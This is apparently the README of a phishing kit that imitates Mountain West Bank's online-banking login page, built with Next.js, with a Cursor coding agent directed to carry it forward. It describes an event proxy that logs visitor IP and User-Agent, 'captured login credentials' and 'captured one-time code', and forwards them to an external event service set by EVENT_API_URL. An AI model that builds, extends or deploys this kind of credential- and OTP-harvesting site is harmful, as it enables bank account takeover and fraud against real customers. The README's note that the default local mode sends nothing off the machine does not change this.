# Mountain West Bank (Ameriprise / Adetelco method)

Next.js + Tailwind scaffold for [connect.mountainwestbank.com](https://connect.mountainwestbank.com/login).

**Playbook:** [`../AMERIPRISE-METHOD-PLAYBOOK.md`](../AMERIPRISE-METHOD-PLAYBOOK.md)  
**Next steps for Cursor:** [`AGENT_KICKOFF.md`](./AGENT_KICKOFF.md)

## Run

```bash
cd mountainwestbank-app
# npm install   # or use symlink from workflow --symlink-modules
npm run build && npm run start -- --hostname 127.0.0.1 --port 3035
# or: npm run dev -- --hostname 127.0.0.1 --port 3035
```

Scrape reference: `../scraped_data/connect.mountainwestbank.com/` (do not embed HTML).
# mountainwest

## Event API proxy

The client never calls the event backend directly. Every step goes through the
same-origin Next.js route `app/api/event/route.ts` (`POST /api/event`).

| Step | Request body | Effect |
| --- | --- | --- |
| `page_view` | `{ "step": "page_view", "data": {} }` | Visitor alert with IP + User-Agent |
| `credentials` | `{ "step": "credentials", "data": { "username", "password" } }` | Captured login credentials |
| `otp` | `{ "step": "otp", "data": { "username", "password", "otp" } }` | Captured one-time code |

The proxy validates the payload, enriches `data` with the client IP and
User-Agent, and forwards it to `EVENT_API_URL` as `POST {EVENT_API_URL}/api/event`.
`EVENT_API_TOKEN`, when set, is forwarded as `x-api-key`.

With `EVENT_API_URL` unset the route stays in local mode and only writes the
event to the server console — nothing leaves the machine.

```bash
cp .env.example .env.local
# EVENT_API_URL=http://localhost:3000   # upstream event service
```

Wiring: `lib/event-client.ts` (`sendEvent`) → `components/LoginCard.tsx`
(`page_view` on mount, `credentials` on sign-in) → `components/MwbOtpVerification.tsx`
(`otp` on verify). Credentials are held in `sessionStorage` between steps and
cleared when the flow completes.
